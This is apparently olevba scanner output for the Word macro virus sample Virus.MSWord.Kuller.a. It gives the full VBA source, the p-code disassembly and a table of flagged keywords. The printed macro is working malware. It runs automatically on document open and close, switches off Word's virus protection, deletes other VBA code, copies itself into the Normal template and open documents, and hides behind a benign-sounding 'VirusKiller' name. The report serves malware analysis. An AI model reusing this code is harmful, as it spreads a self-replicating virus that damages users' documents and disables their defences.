olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kuller.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kuller.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VirusKiller.bas 
in file: Virus.MSWord.Kuller.a - OLE stream: 'Macros/VBA/VirusKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub VirusKill()
    On Error Resume Next
    Dim i, j As Long
    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
    For i = VBE.VBProjects.Count To 1 Step -1
        With VBE.VBProjects(i).VBComponents
            If .Item(1).Name <> "ThisDocument" Then .Item(1).Name = "ThisDocument"
            If .Item(1).CodeModule.CountOfLines > 0 Then .Item(1).CodeModule.DeleteLines 1, .Item(1).CodeModule.CountOfLines
            For j = .Count To 2 Step -1
                If .Item(j).Name <> "VirusKiller" Then .Remove .Item(j) Else .Item(j).Export "c:\VirusKiller"
            Next
        End With
    Next
    For i = VBE.VBProjects.Count To 1 Step -1
        If VBE.VBProjects(i).VBComponents.Count = 1 Then VBE.VBProjects(i).VBComponents.import "c:\VirusKiller"
    Next
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For i = Documents.Count To 1 Step -1
        If Documents(i).Saved = False And Documents(i).Path <> "" Then Documents(i).Save
    Next
    Kill "c:\VirusKiller"
End Sub
Sub AutoOpen()
    Call VirusKill
End Sub
Sub AutoClose()
    Call VirusKill
End Sub
Sub AutoExec()
    Call VirusKill
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Kuller.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/VirusKiller - 2653 bytes
' Line #0:
' 	FuncDefn (Sub VirusKill())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn i
' 	VarDefn j (As Long)
' Line #3:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #4:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld VBE 
' 	MemLd VBProjects 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #5:
' 	StartWithExpr 
' 	Ld i 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd VBComponents 
' 	With 
' Line #6:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "ThisDocument"
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemSt New 
' 	EndIf 
' Line #7:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #8:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	MemLdWith Count 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #9:
' 	Ld j 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000B "VirusKiller"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld j 
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemCallWith Remove 0x0001 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x000E "c:\VirusKiller"
' 	Ld j 
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' 	EndIf 
' Line #10:
' 	StartForVariable 
' 	Next 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Next 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld VBE 
' 	MemLd VBProjects 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #14:
' 	Ld i 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "c:\VirusKiller"
' 	Ld i 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' 	EndIf 
' Line #15:
' 	StartForVariable 
' 	Next 
' Line #16:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #18:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Next 
' Line #20:
' 	LitStr 0x000E "c:\VirusKiller"
' 	ArgsCall Kill 0x0001 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Sub AutoOpen())
' Line #23:
' 	ArgsCall (Call) VirusKill 0x0000 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Sub AutoClose())
' Line #26:
' 	ArgsCall (Call) VirusKill 0x0000 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub AutoExec())
' Line #29:
' 	ArgsCall (Call) VirusKill 0x0000 
' Line #30:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

